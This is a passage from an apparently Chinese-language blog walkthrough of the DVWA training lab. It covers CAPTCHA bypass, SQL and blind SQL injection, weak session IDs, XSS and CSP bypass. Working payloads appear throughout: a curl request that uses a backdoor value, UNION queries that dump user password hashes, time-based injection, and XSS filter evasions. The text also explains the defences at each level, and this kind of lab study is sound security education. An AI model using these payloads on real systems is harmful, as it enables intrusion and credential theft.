+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- **DEV NOTE**   Response: &#x27;hidd3n_valu3&#x27;   &amp;&amp;   User-Agent: &#x27;reCAPTCHA&#x27;   **/DEV NOTE** --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>事实上，当这个页面接收到 POST 请求，其中 <code>g-recaptcha-response</code> 字段为 <code>hidd3n_valu3</code> 并且 UA 为 <code>reCAPTCHA</code> 时，会直接视为通过了验证。</p>
+<p>我并没看懂这一关的逻辑，毕竟 reCAPTCHA 验证代码放在独立的模块里。可能意思是开发者留的后门？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://localhost/vulnerabilities/captcha/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; pma_lang=zh_CN; phpMyAdmin=211204361d2d8ca74ddb7cf6114904ad; pmaUser-1=yfZDMnTAKyPV7j%2B7cQQNL%2FzQSTP4EIu%2BlPfwwl8x8qc8at35nhtpEyye8Rc%3D; security=high; PHPSESSID=c830c512bdc160d1bd45b89fd12a8f27&#x27;</span> \</span><br><span class="line">  -H <span class="string">&quot;User-Agent: reCAPTCHA&quot;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;step=1&amp;password_new=123456&amp;password_conf=123456&amp;g-recaptcha-response=hidd3n_valu3&amp;user_token=0b419bbb618c37f400efc2b2d03337a9&amp;Change=Change&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：正常地使用"><a href="#Impossible：正常地使用" class="headerlink" title="Impossible：正常地使用"></a>Impossible：正常地使用</h3><p>相比前几个等级，这个等级：</p>
+<p>说实话，这才是正常人能想到的 reCAPTCHA 使用方式。这关从 low 到 high 感觉都不是正常人能写出来的代码……</p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL 注入是老生常谈的安全漏洞。本题提供了一个表单，输入 user id 并提交，能够查询指定 id 的用户，并显示列表。</p>
+<p>**攻击者的目标是：**任意操纵数据库。</p>
+<h3 id="Low：无防护-3"><a href="#Low：无防护-3" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>没有任何 SQL 注入的检测。查询 <code>1&#39; OR 1=1; #</code>，可以得到所有记录。说明这关的注入是<strong>字符型</strong>，即输入的内容作为字符串类型。</p>
+<p>**确定该表包含字段数量。**提交 <code>&#39; OR 1=1 ORDER BY 2; #</code> 正常返回，<code>&#39; OR 1=1 ORDER BY 3; #</code> 则报错，说明该表共两个字段。</p>
+<p>**确定服务器包含的数据库。**提交 <code>&#39; AND 0=1 UNION SELECT 1,database(); #</code>，能看到只有 <code>dvwa</code> 这一个数据库。</p>
+<p>**确定数据库包含的所有表。**提交 <code>&#39; AND 0=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;dvwa&#39;; #</code> 可以看到所有表的名称，有 users 和 guestbook。</p>
+<p>**确定表包含的字段。**提交 <code>&#39; AND 0=1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;; #</code> 可以拿到 uses 表包含的所有字段。</p>
+<p>最后就可以想查什么就查什么了。比如用户名和密码的 MD5：<code>&#39; AND 0=1 UNION SELECT user,password FROM users; #</code>。</p>
+<h3 id="Medium：字符转义"><a href="#Medium：字符转义" class="headerlink" title="Medium：字符转义"></a>Medium：字符转义</h3><p>相比 low 等级：</p>
+<p>尝试 <code>1 OR 1=1;#</code> 可以判断这题的注入是<strong>数字型</strong>，即输入内容作为数字类型。那么，不需要用到引号等被过滤的符号。</p>
+<p>直接用和上题一样的方法就好。</p>
+<h3 id="High：单独的页面"><a href="#High：单独的页面" class="headerlink" title="High：单独的页面"></a>High：单独的页面</h3><p>这个等级打开一个单独的页面里发送请求，而响应存在后端 SESSION 里，在原来的页面中才显示。这样用 sqlmap 之类的工具进行注入就会比较麻烦，只能自己写脚本或者手工注入。</p>
+<p>不过，除此之外，其他防护措施和 low 等级一样。</p>
+<h3 id="Impossible：限制数据类型-预编译"><a href="#Impossible：限制数据类型-预编译" class="headerlink" title="Impossible：限制数据类型 &amp; 预编译"></a>Impossible：限制数据类型 &amp; 预编译</h3><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>SQL 盲注，指的是虽然页面存在 SQL 注入的漏洞，但是我们无法直接看到查询的结果，只能看到成功与否之类非常有限的信息。这大大增加了注入难度。</p>
+<p>这一关就是如此：输入用户 ID，只返回用户 ID 是否存在。这相当于每次只给我们 true 或 false 的信息。</p>
+<p>这一关不同难度增加的限制，和上一关完全一致，只有返回显示结果的区别。所以此处只介绍针对 low 的通用方法。</p>
+<p>**猜测是字符型还是整数型。**尝试 <code>1 AND 1=2; #</code> 发现能找到记录，<code>1&#39; AND 1=2; #</code> 则不行，则证明是字符型。</p>
+<p>**猜数据库名长度。**查询 <code>&#39; OR length(database())=4; #</code> 为真，其他长度都为假，说明当前数据库名长度为 4。</p>
+<p>**猜数据库名。**用诸如 <code>&#39; OR ascii(substr(database(),1,1)&gt;97; #</code> 这样的查询，可以一个一个字符猜出数据库名（可以用二分）。其他的猜测和以上注入同理。</p>
+<p><strong>如果程序不返回任何内容，连成功与否都不知道，怎么办呢？<strong>可以利用</strong>延时</strong>。例如：<code>&#39; AND sleep 5</code>。SQL 中的 AND 有和大多数编程语言一样的短路运算，当 AND 左侧为 false 则不计算右侧。如果能找到记录，会等待五秒才返回；如果找不到记录，则会立即返回。通过这种方式我们相当于也获得了 true 或 false 的反馈信息。</p>
+<h2 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h2><p>这个场景只提供一个按钮，每次点击就能生成或更新本地名为 dvwaSession 的 Cookie。</p>
+<p>**攻击者的目标：**猜测下一次生成的 dvwaSession，或者猜测其他用户生成的 dvwaSession。Session 一般作为用户身份的凭证，如果能够猜到其生成方式，往往能够伪造他人身份。</p>
+<h3 id="Low：简单计数器"><a href="#Low：简单计数器" class="headerlink" title="Low：简单计数器"></a>Low：简单计数器</h3><p>非常简单直白的方式生成 dvwaSession：第一次生成 1，之后每次重新生成就加 1。这种方式太容易伪造了。</p>
+<h3 id="Medium：时间戳"><a href="#Medium：时间戳" class="headerlink" title="Medium：时间戳"></a>Medium：时间戳</h3><p>将时间戳作为 dvwaSession。时间戳没有随机性并且可预知，攻击者也完全可以伪造。</p>
+<h3 id="High：计数器-MD5-访问限制"><a href="#High：计数器-MD5-访问限制" class="headerlink" title="High：计数器 MD5 &amp; 访问限制"></a>High：计数器 MD5 &amp; 访问限制</h3><p>这一等级仍然使用计数器作为 dvwaSession，不同之处在于存入 Cookie 时用 MD5 哈希了一下。计数器每次加 1，所以不会很大，可以轻易枚举出哈希前的计数器。</p>
+<p>这一等级还设定了 Cookie 的失效时间为一小时，指定只能在 <code>/vulnerabilities/weak_id/</code> 路径以及当前域名下使用，</p>
+<p>Cookie 的 secure、httpOnly 选项都设为 false，这意味着 Cookie 可以在非 HTTPS 连接下使用、可以被 JavaScript 脚本访问。这是不安全的设置。</p>
+<h3 id="Impossible：随机化-强限制"><a href="#Impossible：随机化-强限制" class="headerlink" title="Impossible：随机化 &amp; 强限制"></a>Impossible：随机化 &amp; 强限制</h3><p>在 high 的基础上：</p>
+<p>相比 high，这个等级：1）无法枚举预测 Cookie；2）有更严格的访问限制。</p>
+<h2 id="DOM-Based-Cross-Site-Scripting-XSS"><a href="#DOM-Based-Cross-Site-Scripting-XSS" class="headerlink" title="DOM Based Cross Site Scripting (XSS)"></a>DOM Based Cross Site Scripting (XSS)</h2><p>在做 XSS 的三个关卡之前，回顾之前 <a target="_blank" rel="noopener" href="https://skywt.cn/blog/xss-labs-tutorial/#%E6%80%BB%E7%BB%93">xss-labs 的题解</a>，执行 JavaScript 代码一般有四种方式：</p>
+<p>这一关提供了一个包含下拉选择框的表单，提供了若干语言选项。</p>
+<p>**攻击者的目标是：**实现 XSS 注入，执行我们想要的 JavaScript 脚本。</p>
+<h3 id="Low：虚假的下拉框"><a href="#Low：虚假的下拉框" class="headerlink" title="Low：虚假的下拉框"></a>Low：虚假的下拉框</h3><p>选择 <code>English</code> 并 Submit，可以发现 <code>English</code> 作为字符串传进了 URL，作为 <code>default</code> 的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/xss_d/?default=English</span><br></pre></td></tr></table></figure>
+
+<p>将 URL 中 <code>English</code> 改为 <code>test</code>，会发现页面里下拉框中文本也变成了 <code>test</code>。显然这个下拉框只是个幌子，<code>default</code> 的值不仅限于这四种语言。</p>
+<p>可以发现表单中有一段脚本用于处理 <code>default</code> 的值，使用了非常愚蠢的 <code>document.write</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);				</span><br></pre></td></tr></table></figure>
+
+<p>那么，将 <code>default</code> 的值改为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 进行 encodeURI 之后的值，即可成功出现弹窗：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<h3 id="Medium：后端过滤-script-标签"><a href="#Medium：后端过滤-script-标签" class="headerlink" title="Medium：后端过滤 script 标签"></a>Medium：后端过滤 script 标签</h3><p>相比 low，在后端添加了检测，如果 URL 的 <code>default</code> 值包含 <code>&lt;script</code> 字串，则强制设置为 <code>English</code>。</p>
+<p>当然，引入 JavaScript 代码的方式并不止 script 标签一种。比如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height: 1000px; width: 1000px&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码将 select 组件闭合，并插入一个其他元素，能够触发弹窗。button 需要点击触发，而插入一个很大的 div 则用户鼠标经过就触发。经过实测，因为这个 div 很大，还是非常容易触发的……</p>
+<p>**⚠️ 浏览器的安全限制：**由于 <code>document.write</code> 存在较多安全问题，已经是强烈不建议使用的方法（参见 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/write">MDN 文档</a>），许多浏览器对其添加了诸多限制，例如 Chrome 浏览器的<a target="_blank" rel="noopener" href="https://developer.chrome.com/blog/removing-document-write/#catch_warnings_in_chrome_devtools">这篇文档</a>。所以，这一关很多更好的方法都无法使用，比如 <code>&lt;img src=1 onerror=&#39;alert(1)&#39;&gt;</code>。</p>
+<p>（除了这种方法之外，使用下述 high 等级的方法也能通过这一关）</p>
+<h3 id="High：后端白名单，但前端简单粗暴"><a href="#High：后端白名单，但前端简单粗暴" class="headerlink" title="High：后端白名单，但前端简单粗暴"></a>High：后端白名单，但前端简单粗暴</h3><p>相比 medium，这关在后端直接使用了白名单：<code>default</code> 参数对应的值只能是 <code>English</code> 等四个值中的一种。其他情况，就重定向到 <code>default=English</code>。</p>
+<p>不过，或许你已经注意到了，前端获取 <code>default</code> 对应的值的这段代码，非常简单粗暴：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接搜索 URL 中 <code>default=</code> 这个字串，不管三七二十一，将等号之后的内容都视为 lang 的值。然而，我们知道如果后面又有别的参数（例如 <code>default=English&amp;param=test</code>），这个参数也会被放进 lang 里，但会被后端忽略。</p>
+<p>所以只要加个 <code>&amp;</code> 就能避免后端的检测了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">English&amp;%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：前端不要-decode"><a href="#Impossible：前端不要-decode" class="headerlink" title="Impossible：前端不要 decode"></a>Impossible：前端不要 decode</h3><p>之前从 low 到 high 的前端代码都犯了非常蠢的错误：直接将拿到的 lang 进行 decode 并在前端展示出来（<code>decodeURI(lang)</code>）。</p>
+<p>事实上，对于 <code>English</code> 等四个选项，其中并不包含任何特殊字符，完全不需要 decode。只要不 decode，攻击者就不可能注入任何特殊字符了。Impossible 就改写了这一点：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过，这个选项仍然不是最好的解决方案，因为使用了 <code>document.write</code> 等非常不优雅的写法，并且用户仍然可能传入非预期的字符串（虽然不可能进行 XSS 攻击了）。如果让我来设计，或许我会将选项从 0 开始编号，URL 中只允许用户传入一个数字编号，在前端将其换成对应的选项。</p>
+<h2 id="Reflected-Cross-Site-Scripting-XSS"><a href="#Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="Reflected Cross Site Scripting (XSS)"></a>Reflected Cross Site Scripting (XSS)</h2><p>这一关提供一个表单，让我们输入名字。当点击提交后，名字会通过 <code>name</code> 这个 param 传送给页面，表单下方会展示「Hello xxx」。</p>
+<h3 id="Low：无防护-4"><a href="#Low：无防护-4" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>没有任何防护。</p>
+<p>输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 并提交，这段代码被原封不动地写入 HTML，就能成功弹窗。</p>
+<h3 id="Medium：子串替换"><a href="#Medium：子串替换" class="headerlink" title="Medium：子串替换"></a>Medium：子串替换</h3><p>后端进行了防护：将输入包含的所有 <code>&lt;script&gt;</code> 子串替换为空串。</p>
+<p>和 File Inclusion 里的 medium 解法相同，可以通过双写的方式规避：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用下文所述 high 的方法也能解决。</p>
+<h3 id="High：正则表达式替换"><a href="#High：正则表达式替换" class="headerlink" title="High：正则表达式替换"></a>High：正则表达式替换</h3><p>相比 medium，这次通过正则表达式替换了 <code>&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t</code>，使用双写的方法无效了。</p>
+<p>同前所述，script 并非引入 JavaScript 的唯一方式。也可以使用：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：htmlspecialchars"><a href="#Impossible：htmlspecialchars" class="headerlink" title="Impossible：htmlspecialchars"></a>Impossible：htmlspecialchars</h3><p>相比 high 等级，这个等级：</p>
+<p>一般来说，为了防范 XSS，使用 PHP 内置的 <code>htmlspecialchars</code> 函数转义字符串，是最优解。</p>
+<h2 id="Stored-Cross-Site-Scripting-XSS"><a href="#Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Stored Cross Site Scripting (XSS)"></a>Stored Cross Site Scripting (XSS)</h2><p>本题场景是一个类似留言板的功能，提供一个表单，可以填写姓名和文本，提交后填写的内容将被存储，在留言列表中展示出来。</p>
+<h3 id="Low：无防护-5"><a href="#Low：无防护-5" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>在 message 中填入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 提交，该内容会被原封不动地���入 HTML 导致弹窗。</p>
+<p>这一关卡所有难度都使用了 <code>mysqli_real_escape_string</code> 过滤了输入，从而防止 SQL 注入攻击。由于 SQL 注入不是本关卡的重点，与 XSS 无关，下面暂时不考虑。</p>
+<h3 id="Medium：name-子串替换"><a href="#Medium：name-子串替换" class="headerlink" title="Medium：name 子串替换"></a>Medium：name 子串替换</h3><p>相比 low，这一关在后端对 name 和 message 分别进行了过滤：</p>
+<p>很显然，对 name 的处理存在和上一关（反射型 XSS）一样的问题，可以双写 <code>&lt;script&gt;</code> 或者使用 img 标签。</p>
+<p>对于 name 输入框的长度限制，直接在浏览器里修改该元素的 maxlength 属性即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="High：name-正则表达式替换"><a href="#High：name-正则表达式替换" class="headerlink" title="High：name 正则表达式替换"></a>High：name 正则表达式替换</h3><p>和反射型 XSS 里一样，将处理 name 字段时的 <code>str_replace</code> 子串替换，换成了基于正则表达式的替换。双写不能用了，但是 img 还是可以用：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：htmlspecialchars-1"><a href="#Impossible：htmlspecialchars-1" class="headerlink" title="Impossible：htmlspecialchars"></a>Impossible：htmlspecialchars</h3><p>相比 high 等级，这个等级：</p>
+<p>存储型 XSS 这一关和反射型非常类似。最佳安全实践也一样：使用 <code>htmlspecialchars</code>。</p>
+<h2 id="Content-Security-Policy-CSP-Bypass"><a href="#Content-Security-Policy-CSP-Bypass" class="headerlink" title="Content Security Policy (CSP) Bypass"></a>Content Security Policy (CSP) Bypass</h2><p>浏览器的内容安全策略，是可以在 Content-Security-Policy 相应头中定义的一系列规则，告诉浏览器在访问内容时应该添加何种限制。</p>
+<p>**攻击者的目标是：**通过 script 标签，引入外部脚本。</p>
+<h3 id="Low：引用-script-的限制"><a href="#Low：引用-script-的限制" class="headerlink" title="Low：引用 script 的限制"></a>Low：引用 script 的限制</h3><p>这一等级给出一个表单，提交的 URL 会被作为 script 的 src 引入。</p>
+<p>这一等级的 Content-Security-Policy 请求头内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja;</span><br><span class="line">// allows js from self, pastebin.com, hastebin.com, jquery, digi.ninja, and google analytics.</span><br></pre></td></tr></table></figure>
+
+<p>页面给出了五个测试链接：</p>
+<p>网页引入的 script 脚本，要满足如下限制：</p>
+<h3 id="Medium：不变的-nonce"><a href="#Medium：不变的-nonce" class="headerlink" title="Medium：不变的 nonce"></a>Medium：不变的 nonce</h3><p>这一等级给出一个表单，提交的内容会被直接插入 HTML 中，且关闭了 XSS 防护。</p>
+<p>该等级的 Content-Security-Policy 请求头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>请求头里包含了 nonce。nonce 后加一个 base64 编码后的字符串。添加这一限制后，所有 script 都必须带上相同的 nonce，否则浏览器就拒绝执行。</p>
+<p>然而，这一等级中 nonce 并不是每次随机生成的，而是一个固定的字符串 <code>Tm...XA=</code>。事实上，base64 解码之后内容是：「Never going to give you up」……</p>
+<p>只要提交这样的一段 script 即可：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="High：JSONP"><a href="#High：JSONP" class="headerlink" title="High：JSONP"></a>High：JSONP</h3><p>这一等级中，页面调用 <code>jsonp.php</code> 执行代码。</p>
+<p>JSONP（JSON with Padding）是一种跨域请求的技术，动态创建 script 标签，并将跨域请求到的资源当作 JavaScript 代码执行。</p>
+<p>可以看到这个页面中 button 绑定的回调函数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">solveSum</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;answer&quot;</span>).<span class="property">innerHTML</span> = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>jsonp.php</code> 脚本内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;callback&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">	<span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$outp</span> = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span> . <span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$outp</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当传入 callback 参数为 <code>solveSum</code>，<code>jsonp.php</code> 将构造一段 JavaScript 代码，这段代码用指定的参数调用 <code>solveSum</code>。即：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">solveSum</span>(&#123;<span class="attr">answer</span>: <span class="number">15</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>其实目的是为了拿到其中的 JSON 数据，但是以调用函数的代码形式返回，外面这层函数就叫做 padding，故名曰 JSON with Padding。</p>
+<p>然而，JSONP 将调用传入的 callback 参数，这个函数是前端传入的。我们只要重新定义 callback 参数的内容，就能让页面执行我们想要的 JavaScript 代码。比如：</p>
